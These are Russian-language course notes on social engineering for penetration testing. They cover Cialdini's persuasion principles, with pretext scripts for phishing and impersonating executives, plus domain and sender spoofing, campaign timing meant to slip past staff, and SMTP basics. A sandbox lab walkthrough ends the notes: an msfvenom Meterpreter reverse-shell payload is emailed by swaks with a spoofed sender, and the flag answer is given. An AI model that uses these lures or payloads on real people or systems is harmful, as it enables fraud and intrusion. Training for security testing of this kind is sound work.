## **Основные понятия**

**Социальная инженерия (атака)** — обман, манипулирование и мошенничество с использованием социальных и психологических аспектов человеческой жизни.

**Разведка по открытым источникам (Open Source Intelligence, OSINT)** — разведывательная дисциплина, включающая в себя поиск, выбор и сбор разведывательной информации из общедоступных источников, а также её анализ.

## Эксплуатация «человеческого фактора»

**«Человеческий фактор»** является самым уязвимым звеном любой системы (системы безопасности — в том числе). Поэтому атаки социальной инженерии основаны на технических решениях и инструментах, которые используют на первом шаге уязвимости мышления и поведения человека и только на последующих шагах — уязвимости информационных систем.

**Цели атак с применением методов социальной инженерии:**

- Выполнение жертвой (сознательно либо неосознанно) необходимых действий
- Раскрытие необходимой информации

Злоумышленники по всему миру используют именно эти техники проведения первичных атак как самые эффективные и работающие безотказно.

## Принципы Чалдини

В 1984 году американский психолог Роберт Чалдини (Robert Cialdini) опубликовал книгу под названием «Психология  
влияния», в которой изложил **шесть принципов убеждения ("six principles of influence"):**

**1. Взаимность (Reciprocity): "Люди платят тем же"**

Мы чувствуем обязанность "вернуть долг" людям, от которых мы что-то получили. Это работает следующим образом:

- Дайте что-то.
- Через какое-то время (не сразу) попросите что-нибудь взамен: возможно, вы даже получите больше.

> **_Примеры использования принципа хакером:_**
> 
> 1. Звоним на ресепшен и говорим: "Я вашему генеральному директору только что отправил посылку из [название другой компании] / его заказ из [название сервиса], но у нас оборвался звонок, не могу ему перезвонить — почему-то попадаю на вас. Подскажете его актуальный номер телефона?"
> 2. Отправляем письмо: "Коллеги, я за вас сделал работу [придумываем, какую], пожалуйста, проверьте её: перейдите по ссылке [адрес ссылки], посмотрите, всё ли корректно?"

**2. Обязательность и последовательность (Commitment and consistency)**

Дав обещание, высказав свою точку зрения или заняв определенную позицию, большинство людей предпочитают ее придерживаться. Даже если мы оказались неправы либо наши обещания уже не имеют практического смысла, мы склонны оправдывать свои обязательства или казаться последовательными в своём мнении (часто по факту последовательными не являясь). По сути, мы вынуждены изобретать обоснования для подтверждения того, что сделали правильный выбор.

> **_Пример использования принципа хакером:_**
> 
> Осторожно "продавить" другого человека на выполнение какого-либо его собственного обещания.

**3. Социальное доказательство (Social proof)**

Люди следуют схожему примеру других (особенно когда нет уверенности, что именно надо делать). Люди, как социальные существа, в большой степени полагаются на сигналы от окружающих о том, как им мыслить, чувствовать и действовать.

> **_Пример использования принципа хакером:_**
> 
> Пишем человеку: "Все твои коллеги уже сделали [какое-либо стандартное рабочее действие], не сделал только ты, как можно скорее отправь письмо / перейди по ссылке [адрес ссылки] / скачай файл ..."

**4. Власть и авторитет (Authority): "Доверьтесь знающему человеку"**

_​_​​​​​​Люди склонны подчиняться тем, кто имеет власть, авторитет, знатокам своего дела, даже если они призывают к сомнительным действиям.

> **_Пример использования принципа хакером:_**
> 
> Звоним сотруднику какой-либо крупной компании (такой, в которой люди не знаю в лицо своего генерального директора) и говорим: "Привет, это [имя и фамилия генерального директора], хочу, чтобы ты лично сделал вот это: как можно скорее отправь письмо / перейди по ссылке [адрес ссылки] / скачай файл / пришли мне номер телефона ..."

**5. Сходство и симпатия (Liking)**

Люди любят тех, кто похож на них, и тех, кто любит их. Если вы хотите влиять на людей, делайте их своими друзьями. Особенно важны подобие и похвала. Подобие по-настоящему единит людей.

> **_Пример использования принципа хакером:_**
> 
> т​​​​о же, что и в предыдущем примере, только представляетесь не генеральным директором, а кем-то, кто очень похож по занимаемой позиции в компании / образу мыслей и паттернам поведения на вашего адресата (например, его коллега).

**6. Дефицит (Scarcity)**

Возможности кажутся более ценными, желанными, когда они становятся менее доступными. Если у нас есть выбор: получить что-либо сейчас или или получить это же в будущем, мы выбираем — получить сейчас. При этом не факт, что нам этот предмет или эта услуга вообще нужны.

> **_Пример использования принципа хакером:_**
> 
> Отправляем письмо: "Мы оформляем подписку на корпоративную программу фитнеса, мест всего 100, пожалуйста, зарегистрируйтесь по ссылке [адрес ссылки] ..."



## Наше положение в сети

Каждый из пользователей — **наша возможность попасть в локальную сеть,** т.к. каждый из пользователей работает с:

- личным компьютером;
- сервером компании;
- базой данных;
- почтовым сервером и др.

![[Pasted image 20240603161521.png]]

## Общие принципы

Перечислим все этапы, которые были показаны в базовом примере:

1. Поиск информации о целях
2. Подготовка сценариев атак
3. Применение сценариев атак и замер результатов

Эти этапы лягут в основу действий по подготовке сценариев социотехнического тестирования — **имитации атак социальной инженерии.** Рассмотрим дальше каждый из этих этапов.

## **Этап 1. Поиск информации о целях**

Список информации о целях детализируется от больших к меньшим. По мере уточнения данных нам будут полезны следующие сущности в организации:

_Компания → Участники организационная структуры компании → Сотрудники_

Конечная цель — **получить информацию о сотрудниках компании, которые имеют требуемый уровень доступа,** и собрать потенциально удобные в использовании «легенды» для подготовки сценария компрометации. 

На этом этапе мы изучаем:

**Компанию:** профиль, процессы, роли, управляющий орган, контактные данные и пр.

Большую часть информации о компании мы получаем, изучая её сайт. Также можно искать информацию в открытых источниках, через поисковые запросы в популярных поисковиках: yandex.ru, google.com, bing.com либо сразу при помощи платформ [СПАРК](https://spark-interfax.ru/), [rusprofile](https://rusprofile.ru/) и пр.

## **Этап 2. Подготовка сценариев**

**Техники маскирования**

- **Маскирование доменов:** формирование похожих доменов, отличающихся одной буквой, цифрой, разделением и пр. символами с целью создания домена, схожего с оригиналом

> [Пример инструментов](https://github.com/elceef/dnstwist)

- **Подмена отправителя:** техника формирования письма в соответствии со стандартами RFC 822, 5322 реализуется таким образом, чтобы влиять на заголовок письма _From_, создавая видимость отправки письмо от стороннего лица
- **Отправка без авторизации в рамках одного домена**

> [SMTP Local Delivery Configuration: пример проблемы](https://serverfault.com/questions/1047411/postfix-how-to-enable-smtp-authentication-on-local-delivery)

- **Evil Proxy (Проброс трафика через прокси):** использование прокси вместо поддельных сайтов для перехвата кодов второго фактора и идеального воспроизведения зеркала сайта


## **Популярные формы сценариев, в которые верят пользователи**

**1. Фишинг (Phishing)**  
Вид интернет-мошенничества, целью которого является получение доступа к конфиденциальным данным пользователей: логинам и паролям.  
  
**2. Vishing (голосовой фишинг)**  
Один из методов мошенничества с использованием социальной инженерии, который заключается в том, что злоумышленники, используя телефонную коммуникацию, под разными предлогами выманивают конфиденциальную информацию или стимулируют к совершению определённых действий.  
  
**3. Baiting**  
Используется "наживка" — разбросанные флэшки, ссылки на бесплатное скачивание интересного контента (фильма, книги и т.п.). При не кибермошенничестве — брошенный кошелек, содержимое которого предлагают разделить, и т.п.

## **Этап 3. Применение сценариев атак и измерение результатов**

**Время запуска:**  
Когда спят / обедают / отсутствуют администраторы и те, кто могут отреагировать превентивно:

- ранние (утренние) часы;
- середина рабочей недели (среда / четверг): чтобы сотрудники могли продолжить “ловиться” и в пятницу.

**Что может пойти не так?**

- **Блокировка вашего рассыльщика:** нужно иметь в виду минимум 3 варианта mail-серверов, если вы хотите отправить порядка тысячи писем

> 1. Публичные серверы: mail.ru, gmail.com, yandex.ru
> 2. Платформы для отправки массовых рассылок: mailgun.com, Amazon Simple Email Service (Amazon SES), SendPuls и пр.
> 3. Собственные почтовые серверы (Можно использовать легковесные образы вроде poste.io)

- **Реагирование на ваш сценарий социальной инженерии:** реакция может произойти в т.ч. по вине вашего сценария, если пользовать заметил неладное и начал писать обращения в техподдержку или коллегам

> Необходимо составлять сценарий так, чтобы пользователь до самого конца и после думал, что все проходит по правилам и по плану.

**Что измерять как результат?**

Заказчику нужно понимать, **в чём уязвимость каждого из действий его сотрудников.** Для каждого конкретного пользователя, времени и сценария, с которым пользователь работает, необходимо измерять:

- открытие писем;
- переходы по ссылкам;
- введенные данные;
- выполнение сценария: ответные действия и пр.


## Техника поиска email-адресов сотрудников организации

Первый принцип работы данной техники заключается в том, что если нам нужно найти электронный адрес только одного сотрудника, то мы можем ее поискать в различных утечках баз данных. Или, зная маску корпоративной почты сотрудников организации, мы можем подобрать адрес нужной нам электронной почты с помощью генератора email-адресов.

**Второй принцип** основан на **Simple Mail Transfer Protocol (SMTP), который предназначен для пересылки писем из одной системы в другую.**

Этот протокол используют почтовые клиенты, такие как Outlook, и почтовые серверы, такие как Microsoft Exchange, межсетевые экраны и т.д.

У **SMTP** есть две главные задачи:

1. Проверка корректности настроек системы и предоставление разрешения на отправку email-сообщения для определенного устройства;
2. Отправка исходящего сообщения на заданный адрес электронной почты и подтверждение успешной доставки. Если сообщение доставить не удается, отправитель получает соответствующее извещение.

Связь по этому протоколу по умолчанию осуществляется в виде открытого текста. Но в настоящее время вы, скорее всего, увидите, как почтовые серверы переключаются с обычного текста на защищенный канал с помощью **SSL/TLS**.

Порты по умолчанию — 25, 465 (больше не используется) и 587.

Где 25 предназначен для использования при отправке от вашего почтового клиента на почтовый сервер, а более высокие порты для ретрансляции между SMTP-сервером. SMTP-сервер может действовать как клиент и как сервер, так как он должен отправлять и получать электронные письма одновременно. Рассмотрим брандмауэр, который обрабатывает все ваши электронные письма, как исходящие, так и входящие — в обоих случаях задействован **SMTP**.

Некоторые термины, используемые вместе с **SMTP**:

**Почтовый пользовательский агент (MUA)**: визуальная часть программы, подключающейся к SMTP-серверу для отправки электронной почты. Скорее всего, это ваш Outlook, Thunderbird или что угодно.

**Агент пересылки почты (MTA)**: транспортная часть программы. Он получает и передает электронные письма. Это может быть сервер Exchange, шлюз с выходом в Интернет и так далее.

В Интернете Вы сможете больше узнать об **SMTP**, и непременно встретите такие термины **как агент отправки почты (MSA), агент доставки почты (MDA)**, и некоторые другие.





## Практика «Атаки с применением методов социальной инженерии»

**Задание**

В стенде имеется почтовый сервер, работающий в домене `sandbox.local`.

У пользователя `Mike` запущен бот, который раз в 30 секунд читает все ранее не прочитанные письма и, при наличии в них вложений запускает их (тем самым эмулируя действия неграмотного сотрудника).

Ваша задача воспользоваться данной уязвимостью и получить доступ к секретному содержимому файла `root.txt`, расположенного на рабочем столе пользователя `Mike`.

> Если не получается самостоятельно выполнить задание, то в следующем шаге можно подсмотреть подсказки. Для максимального эффекта от изучения материала рекомендуется не читать все подсказки разом, а пытаться самостоятельно найти решение задачи.

**В качестве ответа предоставьте содержимое файла `root.txt`.**

Нужно в виртуальной машине запустить стенд Windows 10, с запущенным почтовым сервером и ботом на Python, последний имитирует действия неграмотного сотрудника, который открывает письмо  загружает и запускает файл из него.

1. Сперва нужно сгенерировать файл с нагрузкой

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.2 LPORT=4444 -f exe -o upd.exe
```

где:
windows/meterpreter/reverse_tcp - тип нагрузки.
LHOST=192.168.43.2 - адрес хоста где будет запущен лисенер, в даном случае локальный адрес.
LPORT=4444 - порт хоста.
upd.exe - имя и тип файла.

2.  Дальше нужно запустить  и настроить лисенер

![[Pasted image 20240608152435.png]]

3. Затем нужно отправить письмо с нагрузкой

```bash
swaks --to mike@sandbox.local --from admin@sandbox.local --server 192.168.43.231 --attach @upd.exe
```

![[Pasted image 20240608153003.png]]

Ответ: 54817fe7049221c92542027300015b601

